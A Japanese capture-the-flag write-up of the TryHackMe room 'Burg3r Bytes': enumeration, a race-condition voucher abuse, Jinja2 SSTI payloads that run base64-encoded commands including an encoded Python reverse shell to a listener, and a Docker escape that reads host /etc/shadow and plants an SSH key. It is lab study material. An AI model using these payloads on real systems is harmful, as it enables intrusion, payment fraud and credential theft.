# TryHack3M: Burg3r Bytes CTF

https://tryhackme.com/room/burg3rbytes

## Enumeration

```shell
TARGET=10.49.148.184
sudo bash -c "echo $TARGET  burg.thm >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -vv -sS -p- $TARGET

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 63
```

```sh
sudo nmap -sV -p22,80 $TARGET

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Werkzeug/3.0.2 Python/3.8.10
```

SSH、HTTP。Werkzeug

```sh
root@ip-10-49-90-128:~# nikto -p 80 -T 1 2 3 -h $TARGET
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.49.148.184
+ Target Hostname:    burg.thm
+ Target Port:        80
+ Start Time:         2026-03-26 01:55:59 (GMT0)
---------------------------------------------------------------------------
+ Server: Werkzeug/3.0.2 Python/3.8.10
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Allowed HTTP Methods: HEAD, OPTIONS, GET 
+ OSVDB-3092: /console: This might be interesting...
+ 1707 items checked: 0 error(s) and 3 item(s) reported on remote host
+ End Time:           2026-03-26 01:56:03 (GMT0) (4 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

/console がある。PINコード入力画面が表示される。

### ディレクトリ列挙

```sh
dirb http://$TARGET

---- Scanning URL: http://10.49.148.184/ ----
+ http://10.49.148.184/basket (CODE:200|SIZE:6081)                                                                      
+ http://10.49.148.184/checkout (CODE:200|SIZE:3095)                                                                    
+ http://10.49.148.184/console (CODE:200|SIZE:1563)                                                                     
+ http://10.49.148.184/login (CODE:200|SIZE:7724)                                                                       
+ http://10.49.148.184/register (CODE:200|SIZE:7773)
```

## Web

ルーム説明に下記のように書かれていることから、£3,000,000 のバーガーかピザを購入するのが目的と思われる。

```
Your goal? Exploit this system to score the ultimate haul: 3 million burgers or pizzas.
```

### /register

POST に対して `405 METHOD NOT ALLOWED` が返る不思議な状況。

### /login

registerと同様、POSTに対して405が返る。

### /add-to-bascket

`GET /add-to-basket?itemid=TRYHACK3M-foo HTTP/1.1` のように、存在しない商品をカートに追加しようとすると、`<a href="/?err=NXITEM">` が返る。  
また、成功したときは `/?err=SUCCESS`、すでに同じ商品が入っている場合は `/?err=INBASKET` が返る。  
err パラメータが何かに使われているかは不明。

err以外のパラメータをファジングしてみたが、何も出なかった。

```sh
root@ip-10-48-94-120:~# ffuf -u 'http://burg.thm/?FUZZ=1' -c -w /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt -fs 12758
```

errの値もファジングしたが何も出なかった。

```sh
root@ip-10-48-94-120:~# cat /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt | tr '[:lower:]' '[:upper:]' > upper_common.txt
root@ip-10-48-94-120:~# ffuf -u 'http://burg.thm/?err=FUZZ' -c -w upper_common.txt -fs 12703
```

### /checkout

バスケット画面から遷移。  
無効なバウチャーコードを入れると、`Invalid or Expired Voucher.` 表示。

SQLiは無い。

### セッション

Cookieを消してセッションを紐づける情報が何も無いにもかかわらず、バスケットの内容が維持されている。かなり特異な状況。  
AttackBox でブラウザ表示しても同じ表示になっているため、全ユーザーでバスケットの内容を共有している。しかし、それが何かに使えるかは不明。

```http
GET /basket HTTP/1.1
Host: burg.thm
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://burg.thm/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,ja;q=0.8
Connection: keep-alive
```

checkout画面に遷移したタイミングで、セッションCookieがセットされる。

```http
Set-Cookie: session=eyJjc3JmX3Rva2VuIjoiNmE5MjM0ZmI0M2U1OGI2OWM0NzA3ZTQ0ZjA5MzI0NzQxZWM2NTc2YyJ9.acSfTA.Sc5fhLDhcTk90WS0PzQKLj_3uJk; HttpOnly; Path=/
```

セッションCookieの中には、CSRFトークンが入っている。

```json
{"csrf_token":"6a9234fb43e58b69c4707e44f09324741ec6576c"}
```

また、checkout画面のPOSTでは、パラメータとしてもCSRFトークンが渡されている。

```http
Cookie: session=eyJjc3JmX3Rva2VuIjoiNmE5MjM0ZmI0M2U1OGI2OWM0NzA3ZTQ0ZjA5MzI0NzQxZWM2NTc2YyJ9.acSfTA.Sc5fhLDhcTk90WS0PzQKLj_3uJk

csrf_token=IjZhOTIzNGZiNDNlNThiNjljNDcwN2U0NGYwOTMyNDc0MWVjNjU3NmMi.acSfTA.c-PrHxRzal5sdV1uRbfN1kD9V4U&name=thm&voucher_code=12345&submit=Checkout
```

```
"6a9234fb43e58b69c4707e44f09324741ec6576c"
```

GET -> POST -> GET -> POST ... という形のブルートフォースは可能だが、バウチャーコードにはアルファベットや特殊文字が入る可能性が高く無理筋と思われる。

## 状況整理

詰まったので状況整理のため気になっている点を列挙。

- トップ画面の err パラメータ
- POSTが無効化された login, register
- バスケットが全ユーザーで共有されている
- CSRFトークンの実装
- 課題背景の下記説明

```
今回の新リリースでは、初回登録特典として、全注文に使える10ポンドのクーポンを提供しています。さらに、300万人目の顧客向けには、全商品無料キャンペーンも実施中！
```

バウチャーコードを使わずに注文するフローは無いのかと不思議だったが、バウチャーコードを空欄にして名前だけ入れてPOSTすると、`No money, honey...` と表示されることにここで初めて気が付いた。

名前に対応するBalanceが管理されている？ login, register 画面は名前ではなくEメールアドレスになっているが、checkout画面の名前もEメールアドレスなのかは不明。

トップ画面のレビューに3人の名前が出ている。1000ポンドの注文で試してみたが、3人とも No money だった。

```
cmnatic
melmols
munra
```

もしBalanceが全ユーザーの共通データになっているとしたら、10ポンドバウチャーを異なるユーザーで100回登録したら1000ポンドの購入ができるようになる？？  
またよく考えたら、ログインしていない状態で9.99ポンドと表示されているのは、Balanceも全ユーザーで共有されていることを示唆しているのではないか？  
いずれにしても有効なバウチャーコードが欲しい。

4桁数字をブルートフォースするコードを作成して試してみたが、ヒットしなかった。

```sh
root@ip-10-144-109-200:~# python3 ./csrf_brute.py
```

手あたり次第に試し、`TRYHACK3M` が有効だった。50％OFFクーポン。  
また、/clear-vouchers のリンクが出てきた。

```
Applied Vouchers
['TRYHACK3M']
Total discount: 50.0%
```

異なるユーザー名で使っても、TotalDiscountは50%のまま。  
もし内部的に掛け算になっているとしたら8回かければ9.99ポンドで足りるはずだが、同じユーザー、異なるユーザーで10回送ってみても No money のままだった。  

Burpで同じリクエストを並列で送ったら、購入成功した。

```html
<p>You should be redirected automatically to the target URL: <a href="/receipt/82739098304716027352341076?name=thm">/receipt/82739098304716027352341076?name=thm</a>
```

大した情報が無いのは、1000ポンドのアイテムだからなのか不明。

```
Congratulations on Your Purchase!
Dear thm,

Thank you for purchasing the 3M item! As a token of our appreciation, please find below your special certificate:

TryHack3M
This certifies that thm is now the proud owner of the 3M item.

We hope you enjoy your treat.
```

名前が画面に表示されているので、SSTIを試す。名前を `{{7*'7'}}` として競合を発生させたら、証明書部分に `7777777` と表示された。

```
ngratulations on Your Purchase!

Dear {{7*'7'}},

Thank you for purchasing the 3M item! As a token of our appreciation, please find below your special certificate:
TryHack3M

This certifies that 7777777 is now the proud owner of the 3M item.

We hope you enjoy your treat.
```

## SSTI

ls -al

```json
{{request.application.__globals__.__builtins__.__import__('os').popen('echo bHMgLWFsIHwgYmFzZTY0|base64 -d|bash').read()}}
```

flag.txt を発見。

```sh
total 84
drwxr-xr-x 1 root root 4096 Apr 12  2024 .
drwxr-xr-x 1 root root 4096 Apr 12  2024 ..
-rw-rw-r-- 1 root root 6148 Apr  2  2024 .DS_Store
-rw-rw-r-- 1 root root  389 Apr 12  2024 Dockerfile
-rw-rw-r-- 1 root root   44 Apr  5  2024 README.md
drwxrwxr-x 2 root root 4096 Apr 12  2024 __pycache__
-rw-rw-r-- 1 root root 5205 Apr 10  2024 app.py
drwxrwxr-x 1 root root 4096 Apr 12  2024 cron
-rw-r--r-- 1 root root   24 Apr 12  2024 flag.txt
drwxrwxr-x 1 root root 4096 Apr 12  2024 instance
-rw-rw-r-- 1 root root   60 Apr  2  2024 launch.sh
-rw-rw-r-- 1 root root   53 Apr 10  2024 requirements.txt
drwxrwxr-x 6 root root 4096 Apr 12  2024 static
drwxrwxr-x 2 root root 4096 Apr 12  2024 templates
drwxrwxr-x 4 root root 4096 Apr 12  2024 venv
-rw-rw-r-- 1 root root   59 Apr  2  2024 wsgi.py
```

リバースシェル

```json
{{request.application.__globals__.__builtins__.__import__('os').popen('echo cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjE5Mi4xNjguMTI4LjEwNiIsODg4OCkpO29zLmR1cDIocy5maWxlbm8oKSwwKTsgb3MuZHVwMihzLmZpbGVubygpLDEpO29zLmR1cDIocy5maWxlbm8oKSwyKTtpbXBvcnQgcHR5OyBwdHkuc3Bhd24oInNoIikn |base64 -d|bash').read()}}
```

```sh
$ nc -nlvp 8888    
listening on [any] 8888 ...
connect to [192.168.128.106] from (UNKNOWN) [10.145.148.48] 50880
# id
id
uid=0(root) gid=0(root) groups=0(root)
```

## Dockerエスケープ

ホストユーザーのSSH認証でも入っていないかと site.db を開いたが、バウチャーコードが入っていただけだった。

ゲストOS側からできるエスケープを一通り調べたが、可能性があるとすればカーネルモジュールだけだと思われる。

```sh
root@7b05c5df3d55:/app/instance# cat /proc/sys/kernel/modules_disabled
cat /proc/sys/kernel/modules_disabled
0
root@7b05c5df3d55:/app/instance# which make
which make
/usr/bin/make
```

肝心の capability を調べたいが、capsh が入っていない。

```sh
root@7b05c5df3d55:/app/instance# capsh --print
capsh --print
bash: capsh: command not found
```

代替手段

```sh
root@7b05c5df3d55:/app/instance# cat /proc/self/status | grep Cap
cat /proc/self/status | grep CapEff
CapEff: 00000000a80425fb
```

自分のマシンで

```sh
$ capsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```

CAP_SYS_MODULE は入っていなかったので、カーネルモジュールの線は無い。

### cron

Dockerfile。cronが設定されている。

```sh
root@7b05c5df3d55:/app# cat Dockerfile
cat Dockerfile
FROM ubuntu:20.04

RUN apt-get update -y && \
    apt-get install -y python3 python3-pip python3-dev cron vim


COPY ./requirements.txt /app/requirements.txt


WORKDIR /app

RUN echo "THM{[REDACTED]}" >> /app/flag.txt


RUN pip install -r requirements.txt

COPY . /app

RUN chmod 644 /app/cron/client_py.py
RUN crontab /app/cron/crontab

ENTRYPOINT [ "python3" ]

CMD [ "app.py" ]
```

IPアドレスとポートらしきものを渡して起動している。IPはおそらくホストOSと思われる。

```sh
root@7b05c5df3d55:/app# cat /app/cron/crontab
cat /app/cron/crontab
20 3 * * * cd /app/cron && python3 client_py.py 172.17.0.1 69
```

site.db をReadして保存するために使われているが、Writeも実装されている。

```python
root@7b05c5df3d55:/app# cat /app/cron/client_py.py
cat /app/cron/client_py.py
import sys
import socket
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from Crypto.Signature import pss
from Crypto.Hash import SHA256
import binascii
import base64

MAX_SIZE = 200

opcodes = {
    'read': 1,
    'write': 2,
    'data': 3,
    'ack': 4,
    'error': 5
}

mode_strings = ['netascii', 'octet', 'mail']

with open("client.key", "rb") as f:
    data = f.read()
    privkey = RSA.import_key(data)

with open("client.crt", "rb") as f:
    data = f.read()
    pubkey = RSA.import_key(data)

try:
    with open("server.crt", "rb") as f:
        data = f.read()
        server_pubkey = RSA.import_key(data)
except:
    server_pubkey = False

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.settimeout(3.0)
server_address = (sys.argv[1], int(sys.argv[2]))

def encrypt(s, pubkey):
    cipher = PKCS1_OAEP.new(pubkey)
    return cipher.encrypt(s)

def decrypt(s, privkey):
    cipher = PKCS1_OAEP.new(privkey)
    return cipher.decrypt(s)

def send_rrq(filename, mode, signature, server):
    rrq = bytearray()
    rrq.append(0)
    rrq.append(opcodes['read'])
    rrq += bytearray(filename)
    rrq.append(0)
    rrq += bytearray(mode)
    rrq.append(0)
    rrq += bytearray(signature)
    rrq.append(0)
    sock.sendto(rrq, server)
    return True

def send_wrq(filename, mode, server):
    wrq = bytearray()
    wrq.append(0)
    wrq.append(opcodes['write'])
    wrq += bytearray(filename)
    wrq.append(0)
    wrq += bytearray(mode)
    wrq.append(0)
    sock.sendto(wrq, server)
    return True

def send_ack(block_number, server):
    if len(block_number) != 2:
        print('Error: Block number must be 2 bytes long.')
        return False
    ack = bytearray()
    ack.append(0)
    ack.append(opcodes['ack'])
    ack += bytearray(block_number)
    sock.sendto(ack, server)
    return True

def send_error(server, code, msg):
    err = bytearray()
    err.append(0)
    err.append(opcodes['error'])
    err.append(0)
    err.append(code & 0xff)
    pkt += bytearray(msg + b'\0')
    sock.sendto(pkt, server)

def send_data(server, block_num, block):
    if len(block_num) != 2:
        print('Error: Block number must be 2 bytes long.')
        return False
    pkt = bytearray()
    pkt.append(0)
    pkt.append(opcodes['data'])
    pkt += bytearray(block_num)
    pkt += bytearray(block)
    sock.sendto(pkt, server)

def get_file(filename, mode):
    h = SHA256.new(filename)
    signature = base64.b64encode(pss.new(privkey).sign(h))

    send_rrq(filename, mode, signature, server_address)
    
    file = open(filename, "wb")

    while True:
        data, server = sock.recvfrom(MAX_SIZE * 3)

        if data[1] == opcodes['error']:
            error_code = int.from_bytes(data[2:4], byteorder='big')
            print(data[4:])
            break
        send_ack(data[2:4], server)
        content = data[4:]
        content = base64.b64decode(content)
        content = decrypt(content, privkey)
        file.write(content)
        if len(content) < MAX_SIZE:
            print("file received!")
            break

def put_file(filename, mode):
    if not server_pubkey:
        print("Error: Server pubkey not configured. You won't be able to PUT")
        return

    try:
        file = open(filename, "rb")
        fdata = file.read()
        total_len = len(fdata)
    except:
        print("Error: File doesn't exist")
        return False

    send_wrq(filename, mode, server_address)
    data, server = sock.recvfrom(MAX_SIZE * 3)
    
    if data != b'\x00\x04\x00\x00': # ack 0
        print("Error: Server didn't respond with ACK to WRQ")
        return False

    block_num = 1
    while len(fdata) > 0:
        b_block_num = block_num.to_bytes(2, 'big')
        block = fdata[:MAX_SIZE]
        block = encrypt(block, server_pubkey)
        block = base64.b64encode(block)
        fdata = fdata[MAX_SIZE:]
        send_data(server, b_block_num, block)
        data, server = sock.recvfrom(MAX_SIZE * 3)
        
        if data != b'\x00\x04' + b_block_num:
            print("Error: Server sent unexpected response")
            return False

        block_num += 1

    if total_len % MAX_SIZE == 0:
        b_block_num = block_num.to_bytes(2, 'big')
        send_data(server, b_block_num, b"")
        data, server = sock.recvfrom(MAX_SIZE * 3)
        
        if data != b'\x00\x04' + b_block_num:
            print("Error: Server sent unexpected response")
            return False

    print("File sent successfully")
    return True

def main():
    filename = b'site.db'
    mode = b'netascii'

    get_file(filename, mode)
    exit(0)

if __name__ == '__main__':
    main()
```

試しに、/etc/passwd を指定して実行してみたら、成功したようなメッセージ。

```sh
root@7b05c5df3d55:/app/cron# python3 ./client_py.py  172.17.0.1 69
file received!
root@7b05c5df3d55:/app/cron# ls
client.crt  client.key  client_py.py  client_py.py-bak  crontab  site.db
```

/etc/passwd を確認したら、ホストOSの内容に書き換わっていた。

```sh
root@7b05c5df3d55:/app/cron# cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
landscape:x:110:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
ec2-instance-connect:x:112:65534::/nonexistent:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
tryhackme:x:1001:1001:,,,:/home/tryhackme:/bin/bash
fwupd-refresh:x:113:119:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
```

/etc/shadow をコピーした。

```sh
root@7b05c5df3d55:/app/cron# cat /etc/shadow
root:*:18561:0:99999:7:::
daemon:*:18561:0:99999:7:::
bin:*:18561:0:99999:7:::
sys:*:18561:0:99999:7:::
sync:*:18561:0:99999:7:::
games:*:18561:0:99999:7:::
man:*:18561:0:99999:7:::
lp:*:18561:0:99999:7:::
mail:*:18561:0:99999:7:::
news:*:18561:0:99999:7:::
uucp:*:18561:0:99999:7:::
proxy:*:18561:0:99999:7:::
www-data:*:18561:0:99999:7:::
backup:*:18561:0:99999:7:::
list:*:18561:0:99999:7:::
irc:*:18561:0:99999:7:::
gnats:*:18561:0:99999:7:::
nobody:*:18561:0:99999:7:::
systemd-network:*:18561:0:99999:7:::
systemd-resolve:*:18561:0:99999:7:::
systemd-timesync:*:18561:0:99999:7:::
messagebus:*:18561:0:99999:7:::
syslog:*:18561:0:99999:7:::
_apt:*:18561:0:99999:7:::
tss:*:18561:0:99999:7:::
uuidd:*:18561:0:99999:7:::
tcpdump:*:18561:0:99999:7:::
sshd:*:18561:0:99999:7:::
landscape:*:18561:0:99999:7:::
pollinate:*:18561:0:99999:7:::
ec2-instance-connect:!:18561:0:99999:7:::
systemd-coredump:!!:19053::::::
ubuntu:!:19053:0:99999:7:::
lxd:!:19053::::::
tryhackme:$6$FpYgx[REDACTED]:19825:0:99999:7:::
fwupd-refresh:*:19815:0:99999:7:::
```

PUT しようとすると、鍵のエラーが発生する。

```sh
Error: Server pubkey not configured. You won't be able to PUT
```

server.crt を get した後に、authorized_keys をPUTした。

```sh
root@7b05c5df3d55:/app/cron# mkdir /root/.ssh
root@7b05c5df3d55:/app/cron# echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCvIlxN8R3NWzKYOBS98F0yLKTA0oKvd40QsICxecL3fzRNtQycfTFy2+EXOxpmS2IkUZ/A0evXF3jrUg+1bw9qLcvxuplY6qCGyoD6dPpX4mOu8yUPrcPDSUTKbihkfENktISQCSFZGF2DzCNkHoEGU/K6bWlXjSw2sfCXdqLTjCSrjDqUmbTudTR7jNLSiJot8VrMQRufJt3mUL6T/4AJmSBlpdBLSGUwozxNxw44qZqeb9AS7pcrrktgU02+X7kMEkwaILMieKZYcBu9OeI30jgXzCnMuWYUljjQDOQgH2n5rfWEFJul7q8eXMEjX9ZdAQHd2gGR8QEF4dUKHcVKgwH8A3L7DYZdU8YXBWFBi+BJdcp8S28QAwXoRz2rGq5bqMyxNZzCSXQgN7V8cLb9qwDbbmmps1nf5EQzDP/mEfkEr2fCUvrlpv+8PS/4v5YK8us51wWrAm1a1C3WX3F7NGdQMgxwZ7W9y/rSYpq6WJ5oHHMmahJNuMVaauD8+4M= kali@kali' > /root/.ssh/authorized_keys
root@7b05c5df3d55:/app/cron# vi ./client_py.py
root@7b05c5df3d55:/app/cron# python3 ./client_py.py  172.17.0.1 69
File sent successfully
```

SSH接続成功。

```sh
$ ssh root@10.144.183.43 -i ./id_rsa 

root@thm-burg3rbyte:~# id
uid=0(root) gid=0(root) groups=0(root)
```

ホストフラグ発見。

```sh
root@thm-burg3rbyte:~# ls -al /root
total 48
drwx------  6 root root  4096 Apr 12  2024 .
drwxr-xr-x 19 root root  4096 Mar 30 05:00 ..
lrwxrwxrwx  1 root root     9 Apr 12  2024 .bash_history -> /dev/null
-rw-r--r--  1 root root  3106 Dec  5  2019 .bashrc
drwxr-xr-x  3 root root  4096 Mar 30 05:58 .cache
drwxr-xr-x  3 root root  4096 Mar  2  2022 .local
-rw-r--r--  1 root root   161 Dec  5  2019 .profile
drwx------  2 root root  4096 Mar  2  2022 .ssh
-rw-------  1 root root 11402 Apr 12  2024 .viminfo
-rw-r--r--  1 root root    23 Apr 12  2024 [REDACTED].txt
drwxr-xr-x  4 root root  4096 Mar  2  2022 snap
```

## 振り返り

- クーポンコードは最初から教えてほしかった。
- リクエスト競合の発見は難しかった。
- capsh が無い場合の代替手段を学べて良かった。
- 通常のエスケープをあきらめてCronに注目した判断は合理的にできたと思う。

## Tags

#tags:競合 #tags:SSTI
